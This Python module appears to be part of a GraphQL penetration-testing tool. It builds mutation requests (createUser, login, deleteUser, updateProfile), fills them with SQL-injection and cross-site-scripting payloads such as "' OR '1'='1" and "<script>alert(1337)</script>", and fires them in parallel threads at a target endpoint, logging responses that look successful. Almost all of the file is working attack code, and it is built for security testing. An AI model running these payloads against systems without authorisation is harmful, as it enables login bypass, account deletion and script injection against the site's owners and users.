import requests
import json
import threading
import time
import os
from core.utils import save_to_report

# Base mutation templates
COMMON_MUTATIONS = [
    "mutation { __typename }",
    "mutation { createUser(username:\"admin\", password:\"pass\") { id } }",
    "mutation { login(username:\"admin\", password:\"' or 1=1 --\") { token } }",
    "mutation { deleteUser(id:1) { id } }",
    "mutation { updateProfile(bio:\"<script>alert(1)</script>\") { bio } }"
]

# Fuzzing values to inject
FUZZ_VALUES = [
    "' OR '1'='1",
    "admin' --",
    "\" OR TRUE--",
    "<script>alert(1337)</script>",
    "\\x27\\x20OR\\x201=1--"
]

# Replace fuzzable fields in mutation templates
def mutate_payload(payload):
    mutations = []
    for fuzz in FUZZ_VALUES:
        mutated = payload.replace("admin", fuzz).replace("password", fuzz).replace("bio", fuzz)
        mutations.append(mutated)
    return mutations

# Send HTTP POST with GraphQL mutation
def send_mutation_request(url, mutation, headers, timeout, retries, verbose):
    for attempt in range(retries):
        try:
            data = json.dumps({"query": mutation})
            response = requests.post(url, headers=headers, data=data, timeout=timeout)
            result = {
                "mutation": mutation,
                "status_code": response.status_code,
                "response": response.text[:300]  # Only log first 300 chars
            }

            if verbose:
                print(f"[DEBUG] Tried: {mutation[:80]}... => Status: {response.status_code}")

            # Log only if response is interesting
            if "error" not in response.text.lower() or "success" in response.text.lower():
                print("[!] Interesting behavior detected!")
                save_to_report("mutation_engine", result)

            return result

        except Exception as e:
            if attempt < retries - 1:
                time.sleep(1)
            else:
                print(f"[-] Final failure for mutation: {mutation[:60]} | Error: {e}")
                return {"mutation": mutation, "status_code": "ERROR", "response": str(e)}

# Format entry in readable markdown-style
def format_mutation_log_entry(entry, index):
    status_label = {
        403: "🔒 403 Forbidden",
        405: "🚫 405 Method Not Allowed",
        200: "✅ 200 OK",
        500: "💥 500 Internal Server Error"
    }.get(entry["status_code"], f"🔸 {entry['status_code']}")

    return f"""
#### ⚔️ Mutation #{index} — {status_label}
📤 Payload:

{entry['mutation']}

🧪 Response Snippet:

{entry['response'].strip()}
"""


# Main mutation engine
def run_mutation_engine(base_url, endpoint, headers, threads=5, timeout=10, retries=2, verbose=False):
    url = endpoint if endpoint.startswith("http") else base_url.rstrip("/") + "/" + endpoint.lstrip("/")
    print(f"[*] Fuzzing mutations at: {url} with {threads} threads")

    results = []
    payload_queue = []

    # Generate fuzzed mutations
    for base_mutation in COMMON_MUTATIONS:
        mutated_variants = mutate_payload(base_mutation)
        payload_queue.extend(mutated_variants)

    def worker():
        while payload_queue:
            mutation = payload_queue.pop()
            result = send_mutation_request(url, mutation, headers, timeout, retries, verbose)
            results.append(result)

    # Threaded execution
    thread_list = []
    for _ in range(min(threads, len(payload_queue))):
        t = threading.Thread(target=worker)
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    print(f"[*] Mutation fuzzing complete. {len(results)} mutations tested.")

    # Ensure output directory exists
    os.makedirs("output/logs", exist_ok=True)

    # Save pretty log
    log_path = "output/logs/mutation_log.txt"
    with open(log_path, "w", encoding="utf-8") as f:
        for i, entry in enumerate(results, start=1):
            log_entry = format_mutation_log_entry(entry, i)
            f.write(log_entry)

    # Save raw JSON for automation
    raw_log_path = "output/logs/mutation_raw.json"
    with open(raw_log_path, "w", encoding="utf-8") as jf:
        json.dump(results, jf, indent=2)

    print(f"[+] Formatted mutation results saved to {log_path}")
    print(f"[+] Raw JSON results saved to {raw_log_path}")

    return results
